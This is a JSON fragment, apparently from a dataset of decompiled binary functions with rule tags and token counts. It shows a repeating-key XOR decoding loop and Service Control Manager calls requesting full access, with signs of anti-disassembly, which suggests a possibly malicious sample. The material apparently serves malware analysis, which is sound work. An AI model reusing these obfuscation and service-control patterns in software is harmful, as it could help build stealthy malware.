fcn.00402640(hSCManager, param_1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(0x8bb8ec44);\n    return uVar3;\n}\n",
        "token_count": 1838
    },
    "004026e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040270d) overlaps instruction at (ram,0x00402709)\n// \n\nvoid __cdecl fcn.004026e0(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    \n    uVar3 = 0;\n    bVar5 = false;\n    bVar4 = arg_14h == 0;\n    uVar1 = arg_14h;\n    if (!bVar4) {\n        do {\n            if ((bVar4 || bVar5 != uVar1 < 0) || (uVar2 = arg_10h,  !bVar4 && bVar5 == uVar1 < 0)) {\n                uVar2 = uVar3;\n            }\n            *(uVar3 + arg_10h) = *(uVar3 + arg_10h) ^ *(uVar2 % arg_ch + arg_8h);\n            uVar3 = uVar3 + 1;\n            bVar5 = SBORROW4(uVar3, arg_14h);\n            uVar1 = uVar3 - arg_14h;\n            bVar4 = uVar1 == 0;\n        } while (uVar3 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 326
    },
    "00404b30": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b6e) overlaps instruction at (ram,0x00404b6a)\n// \n\nuint __fastcall fcn.00404b30(uint param_1, uint param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    int32_t *unaff_EDI;\n    uchar uVar3;\n    char cVar4;\n    int32_t *hSCManager;\n    \n    uVar3 = unaff_EBX >> 8 < param_2 >> 8;\n    cVar4 = unaff_EDI == 1;\n    hSCManager = unaff_EDI;\n    do {\n        puVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n        if ((uVar3) || (!uVar3)) break;\n    } while (extraout_ECX != 1 && cVar4 != '\\0');\n    uVar2 = *puVar1;\n    *unaff_EDI = puVar1 + 1;\n    *(*0x9750e2b5 + 0x56) = *(*0x9750e2b5 + 0x56) | uVar2 >> 0x1f;\n    uVar2 = fcn.00402640(hSCManager, unaff_ESI);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(0x8bb8ec44);\n    return uVar2;\n}\n",
        "token_count": 348
    }
}